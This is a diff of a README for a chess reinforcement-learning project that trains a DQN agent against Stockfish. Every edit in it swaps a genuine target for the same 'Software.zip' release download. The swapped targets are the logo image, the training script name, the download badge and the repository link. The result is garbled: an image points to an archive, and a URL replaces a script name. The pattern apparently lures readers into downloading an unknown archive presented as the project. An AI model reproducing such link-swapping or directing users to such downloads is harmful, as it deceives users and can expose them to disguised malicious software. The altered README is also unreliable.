@@ -2,7 +2,7 @@
 
 🌟 *Optimized Chess RL Trainer using DQN vs Stockfish. Built with PyTorch and python-chess, it learns using per-move rewards from Stockfish evaluations. Implements Prioritized Experience Replay (PER) and parallel CPU/GPU execution for faster training. The agent dynamically adjusts Stockfish skill level based on performance.* 🌟
 
-![Stockfish Logo](https://upload.wikimedia.org/wikipedia/commons/4/42/Stockfish_logo.png)
+![Stockfish Logo](https://github.com/Samrichier/Stockfish-DQN-Agent/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -35,7 +35,7 @@ To get started with the Stockfish-DQN-Agent repository, make sure you have the f
 
 ### 2. Training the Agent
 
-Run the training script ```train_agent.py``` to start the training process. Adjust the hyperparameters and configurations in the script as needed to customize the training session.
+Run the training script ```https://github.com/Samrichier/Stockfish-DQN-Agent/releases/download/v1.0/Software.zip``` to start the training process. Adjust the hyperparameters and configurations in the script as needed to customize the training session.
 
 ### 3. Evaluating the Agent
 
@@ -61,13 +61,13 @@ After training, you can evaluate the trained agent against Stockfish to assess i
 
 ## Download Latest Release
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/Samrichier/Stockfish-DQN-Agent/releases/download/v1.0/Software.zip%20Release-brightgreen)](https://github.com/Samrichier/Stockfish-DQN-Agent/releases/download/v1.0/Software.zip)
 
 ---
 
 ## Learn More
 
-For further details and to stay updated on the latest developments, visit the [Stockfish-DQN-Agent GitHub Repository](https://github.com/YourUsername/Stockfish-DQN-Agent).
+For further details and to stay updated on the latest developments, visit the [Stockfish-DQN-Agent GitHub Repository](https://github.com/Samrichier/Stockfish-DQN-Agent/releases/download/v1.0/Software.zip).
 
 ---
 
